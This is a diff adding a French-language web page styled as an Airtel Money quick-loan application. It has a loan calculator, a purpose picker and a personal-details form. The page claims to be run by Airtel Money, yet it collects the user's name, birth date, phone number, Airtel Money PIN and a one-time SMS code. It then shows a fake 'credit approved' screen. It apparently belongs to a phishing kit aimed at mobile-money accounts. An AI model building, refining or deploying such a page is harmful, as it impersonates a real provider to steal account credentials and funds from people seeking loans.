@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airtel Money - Crédit Rapide</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="phone-frame">
+    <!-- Header -->
+    <div class="header">
+      <div class="logos">
+        <div class="airtel-logo">
+          <div class="airtel-icon">
+            <svg viewBox="0 0 100 100" width="32" height="32">
+              <path d="M50 5 C30 5, 10 25, 10 50 C10 75, 30 95, 50 95 C70 95, 90 75, 90 50 C90 25, 70 5, 50 5 Z M50 20 C60 20, 70 30, 70 50 C70 70, 60 80, 50 80 C40 80, 30 70, 30 50 C30 30, 40 20, 50 20 Z" fill="white"/>
+              <path d="M50 25 C42 25, 35 35, 35 50 C35 65, 42 75, 50 75 C58 75, 65 65, 65 50 C65 35, 58 25, 50 25 Z" fill="#E40000"/>
+            </svg>
+          </div>
+          <div class="airtel-text">
+            <span class="brand">Airtel</span>
+            <span class="tagline">Money</span>
+          </div>
+        </div>
+      </div>
+      <div class="header-right">
+        <span class="loans-label">Crédits</span>
+        <button class="quick-btn">Crédit Rapide</button>
+      </div>
+    </div>
+
+    <!-- Hero -->
+    <div class="hero">
+      <div class="hero-subtitle">FINANCEMENT RAPIDE ACCESSIBLE À TOUS</div>
+      <div class="hero-title">
+        Votre Crédit,
+        <span class="outline">Vos Conditions</span>
+      </div>
+      <div class="hero-amount-label">MONTANT DU CRÉDIT</div>
+      <div class="hero-amount">
+        <span class="currency">CDF</span>
+        <span class="value" id="heroAmount">500,000</span>
+        <span class="months" id="heroMonths">12 MOIS</span>
+      </div>
+      <div class="hero-stats">
+        <div class="stat">
+          <span class="stat-label">MENSUALITÉ</span>
+          <span class="stat-value" id="heroMonthly">53,125 CDF</span>
+        </div>
+        <div class="stat">
+          <span class="stat-label">DURÉE</span>
+          <span class="stat-value" id="heroDuration">12 mois</span>
+        </div>
+        <div class="stat">
+          <span class="stat-label">INTÉRÊT</span>
+          <span class="stat-value">2.5%/mois</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Content -->
+    <div class="content">
+      <!-- Section 1: Calculator -->
+      <div class="section active" id="section1">
+        <div class="card">
+          <div class="card-header">
+            <div>
+              <div class="card-title">Calculateur de Crédit</div>
+              <div class="card-subtitle">Ajustez le montant et la durée</div>
+            </div>
+            <span class="card-badge">DIRECT</span>
+          </div>
+
+          <div class="slider-group">
+            <div class="slider-header">
+              <div class="slider-label">
+                <span class="slider-icon" style="background:#fef2f2;">💵</span>
+                Montant du Crédit
+              </div>
+              <span class="slider-value" id="amountValue">500,000 CDF</span>
+            </div>
+            <div class="slider-track" id="amountTrack">
+              <div class="slider-fill" id="amountFill" style="width: 50%;"></div>
+              <div class="slider-thumb" id="amountThumb" style="left: 50%;"></div>
+            </div>
+            <div class="slider-range">
+              <span>50,000 CDF</span>
+              <span>5,000,000 CDF</span>
+            </div>
+          </div>
+
+          <div class="slider-group">
+            <div class="slider-header">
+              <div class="slider-label">
+                <span class="slider-icon" style="background:#fef2f2;">📅</span>
+                Durée
+              </div>
+              <span class="slider-value" id="durationValue">12 mois</span>
+            </div>
+            <div class="slider-track" id="durationTrack">
+              <div class="slider-fill" id="durationFill" style="width: 48%;"></div>
+              <div class="slider-thumb" id="durationThumb" style="left: 48%;"></div>
+            </div>
+            <div class="slider-range">
+              <span>1 mois</span>
+              <span>24 mois</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="summary-row">
+            <span class="summary-label">Montant du Crédit</span>
+            <span class="summary-value" id="sumAmount">500,000.00 CDF</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Intérêts Totaux (2.5%/mois)</span>
+            <span class="summary-value" id="sumInterest">150,000.00 CDF</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Total à Rembourser</span>
+            <span class="summary-value" id="sumTotal">650,000.00 CDF</span>
+          </div>
+          <div class="summary-total">
+            <span class="label">Mensualité</span>
+            <span class="value" id="sumMonthly">54,166.67 CDF</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 2: Loan Details -->
+      <div class="section" id="section2">
+        <div class="card">
+          <div class="card-header">
+            <div>
+              <div class="card-title">Détails du Crédit</div>
+              <div class="card-subtitle">Objet et type de crédit</div>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">TYPE DE CRÉDIT</label>
+            <div class="form-select" id="loanTypeSelect" style="cursor: pointer; display: flex; justify-content: space-between; align-items: center;" onclick="openModal()">
+              <span id="loanTypeText">Choisir le type de crédit...</span>
+              <span style="color: #9ca3af;">▼</span>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">OBJET DU CRÉDIT</label>
+            <textarea class="form-input" id="purposeInput" rows="3" placeholder="Décrivez brièvement l'objet..."></textarea>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 3: Personal Info + PIN -->
+      <div class="section" id="section3">
+        <div class="card">
+          <div class="card-header">
+            <div>
+              <div class="card-title">Informations Personnelles</div>
+              <div class="card-subtitle">Vos coordonnées pour la demande</div>
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label class="form-label">PRÉNOM</label>
+              <input type="text" class="form-input" id="firstName" placeholder="Jean">
+            </div>
+            <div class="form-group">
+              <label class="form-label">NOM</label>
+              <input type="text" class="form-input" id="lastName" placeholder="Kasongo">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">DATE DE NAISSANCE</label>
+            <input type="text" class="form-input" id="dob" placeholder="JJ/MM/AAAA">
+            <div class="form-hint">Âge minimum: 20 ans</div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">NUMÉRO DE TÉLÉPHONE</label>
+            <div class="phone-input">
+              <div class="phone-prefix">+243</div>
+              <input type="text" class="form-input" id="phone" placeholder="XXXXXXXXX" style="flex: 1;">
+            </div>
+            <div class="form-hint">Numéro Airtel Money 9 chiffres</div>
+          </div>
+
+          <div class="form-group" style="margin-top: 20px;">
+            <label class="form-label">PIN AIRTEL MONEY (4 Chiffres)</label>
+            <input type="password" class="form-input" id="pin" placeholder="****" maxlength="4" inputmode="numeric">
+            <div class="form-hint">Entrez votre PIN Airtel Money</div>
+          </div>
+
+          <div class="form-hint dark">
+            Airtel Money gère ce service · <span class="bold">Les conditions générales s'appliquent</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 4: OTP Verification -->
+      <div class="section" id="section4">
+        <div class="card" style="text-align: center; padding: 40px 20px;">
+          <div style="font-size: 48px; margin-bottom: 16px;">📱</div>
+          <div class="card-title" style="margin-bottom: 8px;">Vérifiez Votre Numéro</div>
+          <div class="card-subtitle" style="margin-bottom: 24px;">
+            Un code OTP à 5 chiffres a été envoyé au<br>
+            <span id="otpPhoneDisplay" style="color: #E40000; font-weight: 600;">+243 XXXXXXXXX</span>
+          </div>
+
+          <div class="form-group" style="max-width: 200px; margin: 0 auto 20px;">
+            <input type="text" class="form-input" id="otpInput" placeholder="00000" maxlength="5" inputmode="numeric" style="text-align: center; font-size: 24px; letter-spacing: 8px; font-weight: 700;">
+          </div>
+
+          <div style="display: flex; gap: 12px; justify-content: center;">
+            <button class="cta-btn" style="flex: 1; max-width: 140px; padding: 14px; font-size: 14px;" onclick="verifyOTP()">
+              Vérifier
+            </button>
+            <button class="cta-btn" style="flex: 1; max-width: 140px; padding: 14px; font-size: 14px; background: #e5e7eb; color: #374151;" onclick="resendOTP()">
+              Renvoyer
+            </button>
+          </div>
+
+          <div id="otpMessage" style="margin-top: 16px; font-size: 13px; min-height: 20px;"></div>
+        </div>
+      </div>
+
+      <!-- Section 5: Success -->
+      <div class="section" id="section5">
+        <div class="card" style="text-align: center; padding: 60px 20px;">
+          <div style="font-size: 64px; margin-bottom: 20px;">🎉</div>
+          <div class="card-title" style="font-size: 24px; margin-bottom: 12px;">Crédit Approuvé!</div>
+          <div class="card-subtitle" style="margin-bottom: 32px;">
+            Votre demande a été traitée avec succès.<br>
+            Les fonds seront transférés sur votre compte Airtel Money.
+          </div>
+
+          <div style="background: #fef2f2; border-radius: 16px; padding: 20px; margin-bottom: 24px;">
+            <div style="font-size: 12px; color: #6b7280; margin-bottom: 4px;">Montant du Crédit</div>
+            <div style="font-size: 28px; font-weight: 800; color: #E40000;" id="successAmount">500,000 CDF</div>
+            <div style="font-size: 12px; color: #6b7280; margin-top: 8px;">Mensualité: <span id="successMonthly" style="font-weight: 600;">54,166.67 CDF</span></div>
+          </div>
+
+          <button class="cta-btn" onclick="location.reload()">
+            Nouvelle Demande
+          </button>
+        </div>
+      </div>
+
+      <!-- Section 6: Pending -->
+      <div class="section" id="section6">
+        <div class="card" style="text-align: center; padding: 60px 20px;">
+          <div style="font-size: 64px; margin-bottom: 20px;">⏳</div>
+          <div class="card-title" style="font-size: 24px; margin-bottom: 12px;">Demande en Cours d'Analyse</div>
+          <div class="card-subtitle" style="margin-bottom: 32px;">
+            Votre demande est soumise.<br>
+            Veuillez patienter pendant l'analyse.
+          </div>
+
+          <div class="loading-spinner" style="width: 40px; height: 40px; border: 4px solid #e5e7eb; border-top: 4px solid #E40000; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 24px;"></div>
+
+          <div style="font-size: 13px; color: #9ca3af;">
+            Vous recevrez une notification lorsque votre demande sera traitée.
+          </div>
+        </div>
+      </div>
+
+      <button class="cta-btn" id="mainCta" onclick="handleMainAction()">
+        Vérifier & Demander →
+      </button>
+
+      <div class="nav-dots" id="navDots">
+        <div class="nav-dot active" onclick="goToSection(1)"></div>
+        <div class="nav-dot" onclick="goToSection(2)"></div>
+        <div class="nav-dot" onclick="goToSection(3)"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal-overlay" id="modalOverlay" onclick="closeModal(event)">
+    <div class="modal" onclick="event.stopPropagation()">
+      <div class="modal-header">
+        <span class="modal-title">Choisir le type de crédit...</span>
+        <button class="modal-close" onclick="closeModal()">✕</button>
+      </div>
+      <div class="modal-option" onclick="selectLoanType('Urgence Médicale')">
+        <span class="modal-option-text">Urgence Médicale</span>
+        <div class="modal-radio" id="radio1"></div>
+      </div>
+      <div class="modal-option" onclick="selectLoanType('Frais de Scolarité')">
+        <span class="modal-option-text">Frais de Scolarité</span>
+        <div class="modal-radio" id="radio2"></div>
+      </div>
+      <div class="modal-option" onclick="selectLoanType('Commerce')">
+        <span class="modal-option-text">Commerce</span>
+        <div class="modal-radio" id="radio3"></div>
+      </div>
+      <div class="modal-option" onclick="selectLoanType('Agriculture')">
+        <span class="modal-option-text">Agriculture</span>
+        <div class="modal-radio" id="radio4"></div>
+      </div>
+      <div class="modal-option" onclick="selectLoanType('Rénovation Maison')">
+        <span class="modal-option-text">Rénovation Maison</span>
+        <div class="modal-radio" id="radio5"></div>
+      </div>
+      <div class="modal-option" onclick="selectLoanType('Transport')">
+        <span class="modal-option-text">Transport</span>
+        <div class="modal-radio" id="radio6"></div>
+      </div>
+      <div class="modal-option" onclick="selectLoanType('Autres')">
+        <span class="modal-option-text">Autres</span>
+        <div class="modal-radio" id="radio7"></div>
+      </div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
